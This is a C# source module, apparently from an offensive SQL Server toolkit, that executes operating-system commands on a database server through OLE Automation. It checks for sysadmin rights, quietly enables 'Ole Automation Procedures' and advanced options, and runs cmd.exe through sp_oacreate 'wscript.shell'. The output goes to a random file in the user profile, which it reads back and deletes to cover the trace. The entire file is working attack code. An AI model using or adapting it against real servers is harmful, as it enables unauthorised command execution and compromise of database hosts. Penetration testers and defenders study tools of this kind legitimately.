using System;
using System.Data;
using System.Linq;
using System.Text;

namespace DAFT.Modules
{
    sealed class SQLOSCmdOle
    {
        private string QUERY1_1 = @"
DECLARE @Shell INT
DECLARE @Output varchar(8000)
EXEC @Output = Sp_oacreate 'wscript.shell', @Shell Output, 5
";

        private string QUERY2_1 = @"
DECLARE @fso INT
DECLARE @file INT
DECLARE @o int
DECLARE @f int
DECLARE @ret int 
DECLARE @FileContents varchar(8000) 
EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output, 5
";

        private string QUERY2_3 = @"
EXEC sp_oacreate 'scripting.filesystemobject', @o out
";

        private string QUERY2_5 = @"
EXEC @ret = sp_oamethod @f, 'readall', @FileContents out 
SELECT @FileContents as output";

        private string QUERY3_1 = @"
DECLARE @Shell INT
EXEC Sp_oacreate 'wscript.shell' , @shell Output, 5
";

        private string fileName = string.Empty;

        private readonly Credentials credentials;
        private bool restoreState = false;
        private string instance = string.Empty;
        private string computerName = string.Empty;

        internal SQLOSCmdOle(Credentials credentials)
        {
            this.credentials = credentials;

            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            StringBuilder sb = new StringBuilder();
            sb.Append(@"%USERPROFILE%\");
            for (int i = 0; i < 8; i++)
            {
                int j = random.Next(charactersArray.Length);
                sb.Append(charactersArray[j]);
            }
            sb.Append(".txt");
            fileName = sb.ToString();
        }

        internal void SetInstance(string instance)
        {
            this.instance = instance;
        }

        internal void SetComputerName(string computerName)
        {
            this.computerName = computerName;
        }

        internal void RestoreState()
        {
            restoreState = true;
        }

        internal void Query(string query)
        {
            if (!SQLSysadminCheck.Query(instance, computerName, credentials))
            {
                Console.WriteLine("[-] User is not SysAdmin");
                return;
            }
            using (SQLConnection sql = new SQLConnection(instance))
            {
                sql.BuildConnectionString(credentials);
                if (!sql.Connect())
                    return;

                int sao_value = (int)_Query(sql, @"sp_configure 'Show Advanced Options'", "config_value");
                if (0 == sao_value)
                {
                    Console.WriteLine("{0} : Show Advanced Options is disabled, enabling.", instance);
                    _Query(sql, @"sp_configure 'Show Advanced Options',1;RECONFIGURE", string.Empty);
                }

                int xcs_value = (int)_Query(sql, @"sp_configure 'Ole Automation Procedures'", "config_value");
                if (0 == xcs_value)
                {
                    Console.WriteLine("{0} : Ole Automation Procedures is disabled, enabling.", instance);
                    _Query(sql, @"sp_configure 'Ole Automation Procedures',1;RECONFIGURE", string.Empty);
                }
                
                StringBuilder sb = new StringBuilder();
                sb.Append(QUERY1_1);
                sb.Append(string.Format("EXEC Sp_oamethod @shell, \'run\' , null, \'cmd.exe /c \"{0} > {1}\"\'", query, fileName));
                Console.WriteLine(App.DELIMITER);
                Console.WriteLine((string)_Query(sql, sb.ToString(), string.Empty));
                Console.WriteLine(App.DELIMITER);

                System.Threading.Thread.Sleep(1000);
                sb.Clear();
                sb.Append(QUERY2_1);
                sb.Append(string.Format("EXEC Sp_oamethod @fso, \'opentextfile\' , @file Out, \'{0}\', 1", fileName));
                sb.Append(QUERY2_3);
                sb.Append(string.Format("EXEC sp_oamethod @o, \'opentextfile\', @f out, \'{0}\', 1", fileName));
                sb.Append(QUERY2_5);
                Console.WriteLine((string)_Query(sql, sb.ToString(), "output"));

                sb.Clear();
                sb.Append(QUERY3_1);
                sb.Append(string.Format("EXEC Sp_oamethod @Shell, \'run\' , null, \'cmd.exe /c \"del {0}\"\' , \'0\' , \'true\'", fileName));
                Console.WriteLine((string)_Query(sql, sb.ToString(), string.Empty));

                if (0 == xcs_value && restoreState)
                    _Query(sql, @"sp_configure 'Ole Automation Procedures',0;RECONFIGURE", string.Empty);
                if (0 == sao_value && restoreState)
                    _Query(sql, @"sp_configure 'Show Advanced Options',0;RECONFIGURE", string.Empty);
            }
        }

        private static object _Query(SQLConnection sql, string query, string value)
        {
#if DEBUG
            Console.WriteLine(query);
#endif
            DataTable table = sql.Query(query);
            StringBuilder sb = new StringBuilder();
            try
            {
                if (!string.IsNullOrEmpty(value))
                {
                    foreach (DataRow row in table.AsEnumerable())
                    {
                        if (row[value] is DBNull)
                            sb.Append("\n");
                        else if (row[value] is string)
                            sb.Append(row[value]);
                        else
                            return row[value];
                    }
                }
                return sb.ToString();
            }
            catch (Exception ex)
            {
                if (ex is ArgumentNullException)
                    Console.WriteLine("Empty Response");
                else
                    Console.WriteLine(ex.Message);
            }
            return string.Empty;
        }
    }
}
